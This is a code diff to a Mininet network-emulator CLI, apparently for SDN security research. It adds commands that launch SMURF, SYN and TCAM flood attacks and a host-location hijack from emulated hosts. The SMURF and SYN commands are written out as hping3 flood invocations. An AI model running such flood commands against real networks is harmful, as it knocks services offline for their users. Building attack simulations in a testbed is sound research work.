@@ -68,11 +68,10 @@ class CLI1( CLI ):
             error( 'invalid number of args: time\n' )
         else:
             dur=args[0]
-            s1 = self.mn[ "s1" ]
             h2 = self.mn[ "h2" ]
             h3 = self.mn[ "h3" ]
-            h2serv=TCAMAtack(h2,1,dur)
-            h3serv=TCAMAtack(h3,2,dur)
+            h2serv=TCAMAtack(h2,0,dur)
+            h3serv=TCAMAtack(h3,1,dur)
             h2serv.start()
             h3serv.start()
 
@@ -81,7 +80,9 @@ class CLI1( CLI ):
                 output( '\nH2 and H3 does attack\n')
                 while status:
                     time.sleep(1)
-                    status=h2serv.is_alive() or h3serv.is_alive
+                    status=h2serv.is_alive() or h3serv.is_alive()
+                h2serv.stop()
+                h3serv.stop()
 
             except KeyboardInterrupt:
                 # Output a message - unless it's also interrupted
@@ -95,29 +96,83 @@ class CLI1( CLI ):
 
  
     def do_SMURF( self, _line ):
-        "Lauch TCAM flood attack"
+        "Lauch SMURF flood attack"
         args = _line.split()
         if len(args) != 1:
-            error( 'invalid number of args: simulasi name_file\n' )
+            error( 'invalid number of args: simulasi time\n' )
         else:
-            s1 = self.mn[ "s1" ]
+
+            dur=args[0]
             h2 = self.mn[ "h2" ]
-            h2serv=DOSSMURF(h2)
-            h2serv.start() 
+            h3 = self.mn[ "h3" ]
+            h5 = self.mn[ "h5" ]
+            h2serv=DOSSMURF(h2,dur)
+            h3serv=DOSSMURF(h3,dur)
+            h5serv=DOSSMURF(h5,dur)
+           
+            try:
+                h2serv.start()
+                h3serv.start()
+                h5serv.start()
+                status=h5serv.is_alive()
+                while status:
+                    status=h5serv.is_alive()
+                    output( '\nH2 status '+str(status)+' \n')
+                    time.sleep(1)
+                h2serv.stop()
+                h3serv.stop()
+                h5serv.stop()      
+            except KeyboardInterrupt:
+                # Output a message - unless it's also interrupted
+                # pylint: disable=broad-except
+                try:
+                    output( '\nInterrupt\n' )
+                    h2serv.stop()
+                    h3serv.stop()
+                    h5serv.stop()
+                except Exception:
+                    pass
 
     def do_SYNATACK( self, _line ):
-        "Lauch TCAM flood attack"
+        "Lauch SYN flood attack"
         args = _line.split()
         if len(args) != 1:
-            error( 'invalid number of args: simulasi name_file\n' )
+            error( 'invalid number of args: simulasi time\n' )
         else:
-            s1 = self.mn[ "s1" ]
+
+            dur=args[0]
             h2 = self.mn[ "h2" ]
-            h2serv=DOSSYN(h2)
-            h2serv.start()
+            h3 = self.mn[ "h3" ]
+            h5 = self.mn[ "h5" ]
+            h2serv=DOSSYN(h2,dur)
+            h3serv=DOSSYN(h3,dur)
+            h5serv=DOSSYN(h5,dur)
+
+            try:
+                h2serv.start()
+                h3serv.start()
+                h5serv.start()
+                status=h5serv.is_alive()
+                while status:
+                    status=h5serv.is_alive()
+                    output( '\nH2 status '+str(status)+' \n')
+                    time.sleep(1)
+                h2serv.stop()
+                h3serv.stop()
+                h5serv.stop() 
+            except KeyboardInterrupt:
+                # Output a message - unless it's also interrupted
+                # pylint: disable=broad-except
+                try:
+                    output( '\nInterrupt\n' )
+                    h2serv.stop()
+                    h3serv.stop()
+                    h5serv.stop()
+                except Exception:
+                    pass
 
     def do_HHIJACK( self, _line ):
-        "simulasi"
+        "Host location hijack h1 to h2"
         args = _line.split()
         if len(args) != 1:
             error( 'invalid number of args: simulasi name_file\n' )
@@ -168,13 +223,13 @@ class DOSSMURF(threading.Thread):
     def __init__(self,node,time=10):
         threading.Thread.__init__(self)
         self.node=node
-        self.time=time
+        self.time=int(time)
 
     def run(self):
         try:
             self.popen=self.node.popen("hping3 -1 --flood -a 10.0.0.1 10.0.0.255")
             start = time.time()
-            while time.time()-start<self.time:
+            while int(time.time()-start)<self.time:
                 time.sleep(0.1)
             self.popen.terminate()
         except Exception as e:
@@ -189,13 +244,13 @@ class DOSSYN(threading.Thread):
     def __init__(self,node,time=10):
         threading.Thread.__init__(self)
         self.node=node
-        self.time=time
+        self.time=int(time)
 
     def run(self):
         try:
             self.popen=self.node.popen("hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source 10.0.0.1")
             start = time.time()
-            while time.time()-start<self.time:
+            while int(time.time()-start)<self.time:
                 time.sleep(0.1)
             self.popen.terminate()
         except Exception as e:
@@ -210,17 +265,17 @@ class TCAMAtack(threading.Thread):
     def __init__(self,node,seq=0,time=30):
         threading.Thread.__init__(self)
         self.node=node
-        self.time=time
+        self.time=int(time)
         self.seq=seq
 
     def run(self):
         try:
             if(self.seq==0):
-                self.popen=self.node.popen("python attacklaunch.py 10.0.0.1")
+                self.popen=self.node.popen("python attacklaunch.py")
             else:
-                self.popen=self.node.popen("python attacklaunch2.py 10.0.0.1")
+                self.popen=self.node.popen("python attacklaunch2.py")
             start = time.time()
-            while time.time()-start<self.time:
+            while int(time.time()-start)<self.time:
                 time.sleep(0.1)
             self.popen.terminate()
         except KeyboardInterrupt:
